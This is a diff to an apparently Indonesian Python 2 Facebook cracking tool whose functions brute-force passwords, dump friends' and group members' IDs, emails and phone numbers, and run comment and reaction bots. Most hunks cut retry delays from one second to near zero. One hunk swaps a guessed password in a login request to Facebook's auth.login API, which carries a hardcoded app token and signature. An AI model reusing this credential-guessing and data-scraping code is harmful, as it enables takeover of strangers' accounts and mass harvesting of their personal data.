@@ -154,7 +154,7 @@ def login():
 		else:
 			print("\n\033[1;91m[!] Login Failed")
 			os.system('rm -rf login.txt')
-			time.sleep(1)
+			time.sleep(0.01)
 			login()
 			
 ##### TOKEN #####
@@ -189,7 +189,7 @@ def menu():
 		os.system('reset')
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
@@ -200,7 +200,7 @@ def menu():
 		os.system('reset')
 		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[!] No connection"
@@ -272,7 +272,7 @@ def informasi():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -327,7 +327,7 @@ def dump():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -381,7 +381,7 @@ def id_teman():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -431,7 +431,7 @@ def idfrom_teman():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -489,7 +489,7 @@ def id_member_grup():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -547,7 +547,7 @@ def em_member_grup():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -611,7 +611,7 @@ def no_member_grup():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -675,7 +675,7 @@ def email():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -731,7 +731,7 @@ def emailfrom_teman():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -796,7 +796,7 @@ def nomor_hp():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -853,7 +853,7 @@ def hpfrom_teman():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -918,7 +918,7 @@ def menu_hack():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -961,7 +961,7 @@ def mini():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -1081,7 +1081,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "kontol123"
+												pz6 = "bintang123"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1195,7 +1195,7 @@ def scrak():
 			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(berhasil))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(cekpoint)));sys.stdout.flush()
 	except IOError:
 		print"\n\033[1;91m[!] Sleep"
-		time.sleep(1)
+		time.sleep(0.01)
 	except requests.exceptions.ConnectionError:
 		print"\033[1;91m[✖] No connection"
 		
@@ -1222,7 +1222,7 @@ def super():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.0)
 		login()
 	os.system('reset')
 	print logo
@@ -1457,7 +1457,7 @@ def brute():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -1499,7 +1499,7 @@ def brute():
 					keluar()
 			except requests.exceptions.ConnectionError:
 				print"\033[1;91m[!] Connection Error"
-				time.sleep(1)
+				time.sleep(0.01)
 	except IOError:
 		print ("\033[1;91m[!] File not found")
 		tanyaw()
@@ -1530,7 +1530,7 @@ def menu_yahoo():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -1570,7 +1570,7 @@ def yahoofriends():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -1631,7 +1631,7 @@ def yahoofromfriends():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -1701,7 +1701,7 @@ def yahoomember():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -1771,7 +1771,7 @@ def yahoolist():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -1932,7 +1932,7 @@ def react():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -1965,7 +1965,7 @@ def grup_react():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2016,7 +2016,7 @@ def reactg():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2057,7 +2057,7 @@ def bot_komen():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2093,7 +2093,7 @@ def grup_komen():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2140,7 +2140,7 @@ def deletepost():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2177,7 +2177,7 @@ def accept():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2210,7 +2210,7 @@ def unfriend():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2244,7 +2244,7 @@ def lain():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2286,7 +2286,7 @@ def status():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2312,7 +2312,7 @@ def wordlist():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.system('reset')
@@ -2373,7 +2373,7 @@ def check_akun():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
@@ -2419,7 +2419,7 @@ def grupsaya():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	try:
 		os.mkdir('out')
@@ -2469,7 +2469,7 @@ def guard():
 	except IOError:
 		print"\033[1;91m[!] Token not found"
 		os.system('rm -rf login.txt')
-		time.sleep(1)
+		time.sleep(0.01)
 		login()
 	os.system('reset')
 	print logo
